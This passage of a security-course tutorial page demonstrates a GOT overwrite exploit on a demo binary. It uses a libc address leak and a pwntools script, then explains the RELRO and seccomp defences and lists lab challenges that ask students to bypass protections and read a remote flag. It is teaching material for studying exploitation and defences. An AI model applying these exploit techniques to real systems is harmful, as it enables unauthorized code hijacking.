viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We will also need the address of <code>sleep@got</code> (which is static because the binary is not position independent):</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">silvia@imladris:/sss/demo$ objdump -d -M intel -j .plt ./got_overwrite | grep &quot;sleep@plt&quot; -A1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">080483b0 &lt;sleep@plt&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80483b0:   ff 25 0c a0 04 08       jmp    DWORD PTR ds:0x804a00c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We start the program and compute the address of exit based on the leak of <code>printf</code> (in another terminal):</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&gt;&gt;&gt; printf_offset = 0x513a0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;&gt;&gt; exit_offset = 0x30420</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;&gt;&gt; 0xf7dfb3a0 - printf_offset + exit_offset</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4158497824</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">silvia@imladris:/sss/demo$ ./got_overwrite</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Here&#x27;s a libc address: 0xf7dfb3a0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Give me and address to modify!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x804a00c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Give me a value!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4158497824</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">silvia@imladris:/sss/demo$ echo $?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As we intended, the <code>GOT</code> entry corresponding to <code>sleep</code> was overwritten by exit and the program exited with code 10 without printing the final message.
The following pwntools script automates this interaction:</p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./got_overwrite&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sleep_got </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">elf</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">got</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;sleep&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvuntil</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;libc address:&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc_leak </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvuntil</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;\n&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc_base </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc_leak </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">symbols</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;printf&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Libc base is at: 0x%x&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> libc_base</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exit </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc_base </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">symbols</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;exit&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sleep_got</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvuntil</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;value!&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">exit</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="relro"><code>RELRO</code><a class="hash-link" href="#relro" title="Direct link to heading">​</a></h3><p><code>RELRO</code> (Relocation Read-Only) defends against attacks which overwrite data in relocation sections, such as the <strong><code>GOT</code> overwrite</strong> we showed earlier.</p><p>It comes in two flavors:</p><ul><li><strong>Partial</strong>:
Protects the <code>.init_array</code>, <code>.fini_array</code>, <code>.dynamic</code> and <code>.got</code> sections (but NOT <code>.got.plt</code>).</li><li><strong>Full</strong>:
Additionally protects <code>.got.plt</code>, rendering the <code>GOT</code> overwrite attack infeasible.</li></ul><p>In a previous session we explained how the addresses of dynamically linked functions are resolved using lazy binding.
When <code>Full RELRO</code> is in effect, the addresses are resolved at load-time and then marked as read-only.
Due to the way address space protection works, this means that the <code>.got</code> resides in the read-only mapping, instead of the read-write mapping that contains the <code>.bss</code>.</p><p>This is not a game-over in terms of exploitation, as other writable code pointers often exist.
These can be specific to the application we want to exploit or reside in shared libraries (for example: the GOT of shared libraries that are not compiled with <code>RELRO</code>).
The return addresses on the stack are still viable targets.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="seccomp"><code>seccomp</code><a class="hash-link" href="#seccomp" title="Direct link to heading">​</a></h3><p><code>seccomp</code> is a mechanism though which an application may transition into a state where the system calls it performs are restricted.
The policy, which may act on a whitelist or blacklist model, is described using <a href="https://lwn.net/Articles/593476/" target="_blank" rel="noopener noreferrer"><code>eBPF</code></a>.</p><p><code>secccomp</code> filters are instated using the <code>prctl</code> syscall (<code>PR_SET_SECCOMP</code>).
Once it is in effect, the application will be effectively sandboxed and the restrictions will be inherited by child processes.</p><p>This may severely limit our exploitation prospects in some cases.
In the challenges that we have solved during these sessions, a common goal was spawning a shell and retrieving a certain file (the flag).
If the exploited binary used a <code>seccomp</code> filter that disallowed the <code>execve</code> syscall (used by the <code>system</code> library function), this would have thwarted our exploit.</p><p>The <a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener noreferrer"><code>seccomp-tools</code></a> suite provides tools for analyzing <code>seccomp</code> filters.
The <code>dump</code> subcommand may be used to extract the filter from a binary at runtime and display it in a pseudocode format:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ seccomp-tools dump ./seccomp_example</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> line  CODE  JT   JF      K</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">=================================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In the example above we see a filter operating on the whitelist model: it specifies a subset of syscalls that are allowed: <code>rt_sigreturn</code>, <code>sigreturn</code>, <code>exit_group</code>, <code>exit</code>, <code>open</code>, <code>read</code> and <code>write</code>.</p><p>To install <code>seccomp-tools</code> on the Kali VM, use the the <code>gem</code> package manager:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gem install seccomp-tools</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="challenges">Challenges<a class="hash-link" href="#challenges" title="Direct link to heading">​</a></h2><p>Challenges can be found in the <code>drills/</code> directory.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="01-04-challenges---rwslotmachine-1-4">01-04. Challenges - <code>rwslotmachine</code> <!-- -->[1-4]<a class="hash-link" href="#01-04-challenges---rwslotmachine-1-4" title="Direct link to heading">​</a></h3><p>All of the challenges in this section are intended to be solved with <strong><code>ASLR</code> enabled</strong>.
However, you are free to disable it while developing your exploit for debugging purposes.
You are provided with the needed shared libraries from the remote system.</p><p>The challenges are based on the same &quot;application&quot;: the binaries expose very similar functionality with minimal implementation differences.
Your job is to identify the defense mechanisms in use for each of them and bypass them in order to read a flag from the remote system.</p><p>They are numbered in the suggested solving order.</p><p><strong>Tips</strong>:</p><ul><li>Do not waste time on reverse engineering <code>rwslotmachine3</code>!
It is very similar to <code>rwslotmachine2</code>, but operates on the client/server model.</li><li>To set <code>LD_LIBRARY_PATH</code> from within a pwntools script, use <code>p = process(&#x27;./rwslotmachineX&#x27;, env={&#x27;LD_LIBRARY_PATH&#x27; : &#x27;.&#x27;})</code>.</li><li>In the case of <code>rwslotmachine4</code>, you will need the shared library <code>libint.so</code> (found inside of the GitHub repository).</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="05-bonus---rwslotmachine5">05. Bonus - <code>rwslotmachine5</code><a class="hash-link" href="#05-bonus---rwslotmachine5" title="Direct link to heading">​</a></h3><p>This challenge is similar to <code>rwslotmachine1</code>.
However, your exploit for the first challenge will (most likely) not work.
Investigate why and develop a bypass.</p><p><strong>Hint</strong>: You can find a table describing x86 syscalls <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit" target="_blank" rel="noopener noreferrer">here</a>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="further-reading">Further Reading<a class="hash-link" href="#further-reading" title="Direct link to heading">​</a></h2><ul><li><a href="https://en.wikipedia.org/wiki/PaX#PAGEEXEC" target="_blank" rel="noopener noreferrer"><code>PaX PAGEEXEC</code></a></li><li><a href="https://en.wikipedia.org/wiki/PaX#SEGMEXEC" target="_blank" rel="noopener noreferrer"><code>PaX SEGMEXEC</code></a></li><li><a href="http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf" target="_blank" rel="noopener noreferrer">Black Hat &amp; DEF CON 2010, JIT spraying slides</a>;</li><li><a href="http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf" target="_blank" rel="noopener noreferrer">Interpreter Exploitation. Pointer Inference and JIT Spraying</a>.</li><li><a href="https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention" target="_blank" rel="noopener noreferrer"><code>DEP</code></a></li><li><a href="https://lwn.net/Articles/593476/" target="_blank" rel="noopener noreferrer"><code>eBPF</code></a></li></ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/binary-security/Mitigation and Defensive Strategies/Defense Mechanisms/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Defense Mechanisms</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/binary-security/Mitigation and Defensive Strategies/Information Leaks/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Information Leaks</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#introduction" class="table-of-contents__link toc-highlight">Introduction</a></li><li><a href="#tutorials" class="table-of-contents__link toc-highlight">Tutorials</a><ul><li><a href="#general-defense-mechanisms-check" class="table-of-contents__link toc-highlight">General Defense Mechanisms Check</a></li><li><a href="#executable-space-protection" class="table-of-contents__link toc-highlight">Executable Space Protection</a></li><li><a href="#memory-segments-permissions-walkthrough" class="table-of-contents__link toc-highlight">Memory Segments Permissions Walkthrough</a></li><li><a href="#ways-of-bypassing-nx" class="table-of-contents__link toc-highlight">Ways of Bypassing NX</a></li><li><a href="#address-space-layout-randomization" class="table-of-contents__link toc-highlight">Address Space Layout Randomization</a></li><li><a href="#ways-of-bypassing-aslr" class="table-of-contents__link toc-highlight">Ways of Bypassing ASLR</a></li><li><a href="#chaining-information-leaks-with-got-overwrite" class="table-of-contents__link toc-highlight">Chaining Information Leaks with GOT Overwrite</a></li><li><a href="#relro" class="table-of-contents__link toc-highlight"><code>RELRO</code></a></li><li><a href="#seccomp" class="table-of-contents__link toc-highlight"><code>seccomp</code></a></li></ul></li><li><a href="#challenges" class="table-of-contents__link toc-highlight">Challenges</a><ul><li><a href="#01-04-challenges---rwslotmachine-1-4" class="table-of-contents__link toc-highlight">01-04. Challenges - <code>rwslotmachine</code> 1-4</a></li><li><a href="#05-bonus---rwslotmachine5" class="table-of-contents__link toc-highlight">05. Bonus - <code>rwslotmachine5</code></a></li></ul></li><li><a href="#further-reading" class="table-of-contents__link toc-highlight">Further Reading</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://security-summer-school.github.io/binary/" target="_blank" rel="noopener noreferrer" class="footer__link-item">site<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://www.facebook.com/SSSUPB/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Facebook<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 SSS Team</div></div></div></footer></div>
<script src="/binary-security/assets/js/runtime~main.74200969.js"></script>
<script src="/binary-security/assets/js/main.d9be8505.js"></script>
</body>
</html>